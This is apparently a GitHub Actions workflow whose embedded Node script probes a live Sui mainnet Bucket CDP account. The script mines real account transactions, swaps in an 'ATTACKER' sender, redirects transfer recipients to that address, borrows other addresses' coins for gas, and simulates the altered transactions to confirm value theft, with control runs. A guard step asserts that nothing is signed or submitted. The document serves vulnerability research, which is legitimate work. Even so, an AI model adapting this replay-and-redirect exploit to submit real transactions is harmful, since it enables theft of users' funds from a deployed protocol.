name: Bucket CDP Account Value-Output Replay R25

on:
  pull_request:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  replay:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4

      - name: Install official Mysten SDK
        shell: bash
        run: |
          set -euo pipefail
          rm -rf bucket-cdp-account-output-r25
          mkdir -p bucket-cdp-account-output-r25/raw
          cd bucket-cdp-account-output-r25
          npm init -y >/dev/null
          npm pkg set type=module >/dev/null
          npm install --no-audit --no-fund @mysten/sui@2.23.2
          npm list @mysten/sui | tee SDK_VERSION.txt

      - name: Mine output-producing production PTBs and replay as an unrelated sender
        shell: bash
        run: |
          set -euo pipefail
          cat > bucket-cdp-account-output-r25/probe.mjs <<'JS'
          import fs from 'node:fs';
          import { Transaction } from '@mysten/sui/transactions';
          import { SuiGrpcClient } from '@mysten/sui/grpc';

          const RPCS = ['https://fullnode.mainnet.sui.io:443', 'https://sui-mainnet-endpoint.blockvision.org'];
          const client = new SuiGrpcClient({ network: 'mainnet', baseUrl: RPCS[0] });
          const ACCOUNT = '0x0bd4c9887129746355e0b44552fc2c92787a4fa418249ce1f92e84ab47e28b54';
          const ATTACKER = '0x1111111111111111111111111111111111111111111111111111111111111111';
          const ACCOUNT_FUNCTION_PACKAGE = '0xe2d49d67ff42dc500275f2d84841bf35632aa6c1abdb70af66a10e1de93a4400';
          const SUI = '0x2::sui::SUI';
          const GAS_CANDIDATES = [
            '0xaa3f912fe367c683001161ce16e040b606437f03c30c346fd17548425783a9a6',
            '0x954ee376568ab84a439cf3c7548f7bba7c2e923d0e333ea055b397ca2f34ada9',
          ];

          async function rpc(method, params) {
            const failures = [];
            for (const endpoint of RPCS) {
              try {
                const response = await fetch(endpoint, {
                  method: 'POST', headers: { 'content-type': 'application/json' },
                  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
                });
                const body = await response.json();
                if (body.error) throw new Error(JSON.stringify(body.error));
                return { endpoint, result: body.result };
              } catch (error) {
                failures.push({ endpoint, error: error?.message ?? String(error) });
              }
            }
            return { failures };
          }

          async function gasSponsor() {
            for (const owner of GAS_CANDIDATES) {
              const wrapper = await rpc('suix_getCoins', [owner, SUI, null, 50]);
              const coin = (wrapper?.result?.data ?? [])
                .filter((row) => BigInt(row.balance ?? 0) > 200_000_000n)
                .sort((a, b) => BigInt(a.balance) < BigInt(b.balance) ? 1 : -1)[0];
              if (coin) return { owner, coin: { objectId: coin.coinObjectId, version: String(coin.version), digest: coin.digest, balance: coin.balance } };
            }
            return null;
          }

          function callOf(command) {
            return command?.MoveCall ?? (command?.$kind === 'MoveCall' ? command.MoveCall : null);
          }
          function transferOf(command) {
            return command?.TransferObjects ?? (command?.$kind === 'TransferObjects' ? command.TransferObjects : null);
          }
          function sourceCommands(tx) {
            return tx?.transaction?.data?.transaction?.transactions ?? [];
          }
          function chainNames(tx) {
            return sourceCommands(tx).map(callOf).filter(Boolean).map((call) => `${call.module}::${call.function}`);
          }
          function hasChain(tx) {
            const names = chainNames(tx);
            return ['vault::borrow_protocol_cap', 'account::request_with_account', 'vault::debtor_request', 'vault::update_position']
              .every((name) => names.includes(name));
          }
          function addressOf(change) {
            return String(change?.address ?? change?.owner?.AddressOwner ?? change?.owner?.address ?? '');
          }
          function sourcePositiveNonGas(tx) {
            const sender = tx?.transaction?.data?.sender;
            return (tx?.balanceChanges ?? []).some((row) => {
              try {
                return addressOf(row) === sender && !String(row.coinType).endsWith('::sui::SUI') && BigInt(row.amount) > 0n;
              } catch { return false; }
            });
          }
          function programmableHasOwnedInput(tx) {
            const inputs = tx?.transaction?.data?.transaction?.inputs ?? [];
            return inputs.some((input) => {
              const kind = String(input?.objectType ?? input?.type ?? '').toLowerCase();
              return kind.includes('immorowned') || kind.includes('ownedobject') || Boolean(input?.ImmOrOwnedObject);
            });
          }

          const query = await rpc('suix_queryTransactionBlocks', [{
            filter: { InputObject: ACCOUNT },
            options: { showInput: true, showRawInput: true, showEffects: true, showEvents: true, showObjectChanges: true, showBalanceChanges: true },
          }, null, 100, true]);
          fs.writeFileSync('raw/account_transactions.json', JSON.stringify(query, null, 2));
          const candidates = (query?.result?.data ?? []).filter((tx) => {
            const status = tx?.effects?.status?.status ?? tx?.effects?.status?.success;
            return (status === 'success' || status === true)
              && tx.rawTransaction
              && hasChain(tx)
              && sourcePositiveNonGas(tx)
              && !programmableHasOwnedInput(tx);
          });
          fs.writeFileSync('raw/candidates.json', JSON.stringify(candidates, null, 2));
          const sponsor = await gasSponsor();
          fs.writeFileSync('raw/gas_sponsor.json', JSON.stringify(sponsor, null, 2));

          function dataOf(tx) {
            const data = tx.getData();
            return { data, commands: data.commands ?? data.transactions ?? [] };
          }
          function configure(tx, checked) {
            tx.setSender(ATTACKER);
            if (checked && sponsor) {
              tx.setGasOwner(sponsor.owner);
              tx.setGasPayment([{ objectId: sponsor.coin.objectId, version: sponsor.coin.version, digest: sponsor.coin.digest }]);
              tx.setGasBudget(250_000_000);
            }
          }
          function redirect(tx) {
            const recipient = tx.pure.address(ATTACKER);
            let count = 0;
            for (const command of dataOf(tx).commands) {
              const transfer = transferOf(command);
              if (!transfer) continue;
              if ('address' in transfer) transfer.address = recipient;
              else if ('recipient' in transfer) transfer.recipient = recipient;
              else if (Array.isArray(transfer)) transfer[transfer.length - 1] = recipient;
              count += 1;
            }
            return count;
          }
          function freshEoa(tx) {
            let count = 0;
            for (const command of dataOf(tx).commands) {
              const call = callOf(command);
              if (!call || call.module !== 'account' || call.function !== 'request_with_account') continue;
              call.package = ACCOUNT_FUNCTION_PACKAGE;
              call.function = 'request';
              call.arguments = [];
              if ('typeArguments' in call) call.typeArguments = [];
              if ('type_arguments' in call) call.type_arguments = [];
              count += 1;
            }
            return count;
          }
          function wrongKey(tx) {
            let count = 0;
            for (const command of dataOf(tx).commands) {
              const call = callOf(command);
              if (!call || call.module !== 'vault' || call.function !== 'borrow_protocol_cap') continue;
              const args = call.arguments ?? [];
              if (args.length >= 2) args[1] = tx.pure.string('not_bucket_account');
              call.arguments = args;
              count += 1;
            }
            return count;
          }

          function parsed(result) {
            if (result?.$kind === 'Transaction') return { success: true, payload: result.Transaction, error: null };
            if (result?.$kind === 'FailedTransaction') {
              const payload = result.FailedTransaction;
              return { success: false, payload, error: payload?.status?.error ?? payload?.effects?.status?.error ?? null };
            }
            if (result?.Transaction) return { success: true, payload: result.Transaction, error: null };
            if (result?.FailedTransaction) {
              const payload = result.FailedTransaction;
              return { success: false, payload, error: payload?.status?.error ?? payload?.effects?.status?.error ?? null };
            }
            return { success: false, payload: result, error: result?.thrown ?? { message: 'unknown result shape' } };
          }
          function attackerDeltas(payload) {
            return (payload?.balanceChanges ?? []).filter((row) => addressOf(row) === ATTACKER).map((row) => ({ coinType: row.coinType, amount: String(row.amount), owner: row.owner ?? row.address }));
          }
          function positiveNonGas(rows) {
            return rows.some((row) => {
              try { return !String(row.coinType).endsWith('::sui::SUI') && BigInt(row.amount) > 0n; } catch { return false; }
            });
          }
          async function simulate(candidate, label, checked, mutation) {
            const tx = Transaction.from(candidate.rawTransaction);
            configure(tx, checked);
            const mutationResult = mutation(tx);
            let result;
            try {
              result = await client.core.simulateTransaction({
                transaction: tx,
                ...(checked ? {} : { checksEnabled: false }),
                include: { commandResults: true, effects: true, events: true, balanceChanges: true, objectTypes: true, transaction: true },
              });
            } catch (error) {
              result = { thrown: { name: error?.name, message: error?.message, stack: error?.stack, cause: error?.cause } };
            }
            fs.writeFileSync(`raw/${candidate.digest}_${label}.json`, JSON.stringify(result, null, 2));
            const state = parsed(result);
            const error = state.error;
            const deltas = attackerDeltas(state.payload);
            return {
              digest: candidate.digest,
              sourceSender: candidate?.transaction?.data?.sender,
              label, checked,
              success: state.success,
              mutationResult,
              attackerBalanceDeltas: deltas,
              positiveNonGasDelta: positiveNonGas(deltas),
              errorMessage: error?.message ?? JSON.stringify(error),
              abortCode: error?.MoveAbort?.abortCode ?? null,
              abortLocation: error?.MoveAbort?.location ?? null,
            };
          }

          const attempts = [];
          for (const candidate of candidates.slice(0, 20)) {
            attempts.push(await simulate(candidate, 'attacker_unchecked', false, (tx) => ({ redirectedTransfers: redirect(tx) })));
            if (sponsor) attempts.push(await simulate(candidate, 'attacker_checked', true, (tx) => ({ redirectedTransfers: redirect(tx) })));
            const winner = attempts.find((row) => row.digest === candidate.digest && row.success && row.positiveNonGasDelta);
            if (winner) {
              attempts.push(await simulate(candidate, 'fresh_eoa_control', false, (tx) => ({ replacedRequest: freshEoa(tx), redirectedTransfers: redirect(tx) })));
              attempts.push(await simulate(candidate, 'wrong_key_control', false, (tx) => ({ replacedKey: wrongKey(tx), redirectedTransfers: redirect(tx) })));
              break;
            }
          }
          const winner = attempts.find((row) => row.label.startsWith('attacker_') && row.success && row.positiveNonGasDelta);
          const eoa = winner ? attempts.find((row) => row.digest === winner.digest && row.label === 'fresh_eoa_control') : null;
          const wrong = winner ? attempts.find((row) => row.digest === winner.digest && row.label === 'wrong_key_control') : null;
          const gates = {
            candidateCount: candidates.length,
            attackerValueOutputSuccess: Boolean(winner),
            freshEoaRejected: eoa?.success === false,
            wrongKeyRejected: wrong?.success === false,
          };
          gates.exploitConfirmed = gates.attackerValueOutputSuccess && gates.freshEoaRejected && gates.wrongKeyRejected;
          const summary = {
            schema: 'bucket-cdp-account-value-output-replay-r25/v1',
            network: 'sui-mainnet', readOnly: true,
            account: ACCOUNT, attacker: ATTACKER,
            candidateDigests: candidates.map((tx) => tx.digest),
            attempts, winner, gates,
            productionTransactionsSubmitted: 0,
            generatedUnix: Math.floor(Date.now() / 1000),
          };
          fs.writeFileSync('SUMMARY.json', JSON.stringify(summary, null, 2));
          console.log('BUCKET_R25_SUMMARY=' + JSON.stringify({ winner, gates, attempts }));
          JS
          cd bucket-cdp-account-output-r25
          node probe.mjs | tee run.log
          find . -type f ! -path './node_modules/*' -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS.txt

      - name: Validate read-only boundary
        shell: bash
        run: |
          set -euo pipefail
          grep -RniE 'executeTransaction|signAndExecute|private.?key|mnemonic' bucket-cdp-account-output-r25 && exit 1 || true
          python3 - <<'PY'
          import json
          summary = json.load(open('bucket-cdp-account-output-r25/SUMMARY.json'))
          assert summary['readOnly'] is True
          assert summary['productionTransactionsSubmitted'] == 0
          print('BUCKET_CDP_ACCOUNT_OUTPUT_R25_READ_ONLY_PASS')
          print('EXPLOIT_CONFIRMED=', summary['gates']['exploitConfirmed'])
          PY

      - name: Upload evidence
        uses: actions/upload-artifact@v4
        with:
          name: bucket-cdp-account-output-r25
          path: |
            bucket-cdp-account-output-r25/SUMMARY.json
            bucket-cdp-account-output-r25/SDK_VERSION.txt
            bucket-cdp-account-output-r25/probe.mjs
            bucket-cdp-account-output-r25/run.log
            bucket-cdp-account-output-r25/SHA256SUMS.txt
            bucket-cdp-account-output-r25/raw
          if-no-files-found: error
          retention-days: 7
